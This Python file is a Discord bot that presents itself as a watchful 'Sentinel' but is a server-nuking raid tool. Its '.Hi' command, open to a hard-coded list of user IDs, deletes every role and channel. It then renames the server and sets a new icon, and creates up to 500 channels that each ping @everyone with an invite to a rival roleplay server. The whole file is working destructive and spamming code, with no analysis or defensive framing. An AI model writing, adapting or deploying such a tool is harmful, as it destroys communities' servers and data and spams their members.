import sys
import os
import discord
import asyncio
import aiohttp
from discord.ext import commands
from keep_alive import keep_alive  # Optional keep_alive for hosting

keep_alive()

# Force UTF-8 encoding
sys.stdout.reconfigure(encoding='utf-8')

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)
Token = os.environ.get("Token")

# Authorized users for restricted commands
AUTHORIZED_USER_IDS = [
    719648115639975946,
    1140178029482610718,
    712499082408755210,
    667936742770343947,
    1342627080873054329
]

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="over the server 👁️"))
    print(f'✅ Sentinel is online as {bot.user}')

@bot.command()
async def Hi(ctx):
    if ctx.author.id not in AUTHORIZED_USER_IDS:
        await ctx.send("❌ You are not authorized to use this command.")
        return

    guild = ctx.guild
    invite_link = "https://discord.gg/nRAmSNwK"
    await ctx.send("Hi 11Ops. You know what time it is")

    # Delete all roles except @everyone
    for role in guild.roles:
        if role.name != '@everyone':
            await delete_role(role)

    # Delete all channels
    for channel in guild.channels:
        await delete_channel(channel)

    print("✅ Finished deleting channels and roles.")

    # Update server name and icon
    try:
        logo_url = "https://cdn.discordapp.com/attachments/1342240703157112997/1360860432008745050/414cf46982f0562c61f2a9876ae3cf82.png"
        async with aiohttp.ClientSession() as session:
            async with session.get(logo_url) as resp:
                if resp.status == 200:
                    image_data = await resp.read()
                    await guild.edit(name="Bayview OT", icon=image_data)
                    print("🏷️ Server name changed to Bayview OT and logo set.")
                else:
                    print(f'⚠️ Failed to fetch logo image: {resp.status}')
    except Exception as e:
        print(f'⚠️ Failed to change server name and set logo: {e}')

    # Create spam channels and send embed
    MAX_CHANNELS = 500
    try:
        for _ in range(MAX_CHANNELS):
            channel = await guild.create_text_channel("bayview-OT")
            print(f'📁 Created channel: {channel.name}')

            embed = discord.Embed(
                title="🚨 Join Bayview Roleplay!",
                description=f"[Click here to join Bayview Roleplay]({invite_link})",
                color=discord.Color.red()
            )
            embed.set_footer(text="Bayview OT")
            embed.set_thumbnail(url=logo_url)

            await channel.send(content="@everyone", embed=embed)

        await ctx.send(f"✅ Created {MAX_CHANNELS} channels and sent embed invites.")
    except Exception as e:
        print(f'❌ Error creating channels: {e}')
        await ctx.send("⚠️ An error occurred during channel creation.")

# Helper functions
async def delete_channel(channel):
    try:
        await channel.delete()
        print(f'🗑️ Deleted channel: {channel.name}')
    except discord.Forbidden:
        print(f'🚫 Permission error deleting channel: {channel.name}')
    except Exception as e:
        print(f'❌ Error deleting channel {channel.name}: {e}')

async def delete_role(role):
    try:
        await role.delete()
        print(f'🗑️ Deleted role: {role.name}')
    except discord.Forbidden:
        print(f'🚫 Permission error deleting role: {role.name}')
    except Exception as e:
        print(f'❌ Error deleting role {role.name}: {e}')

bot.run(Token)
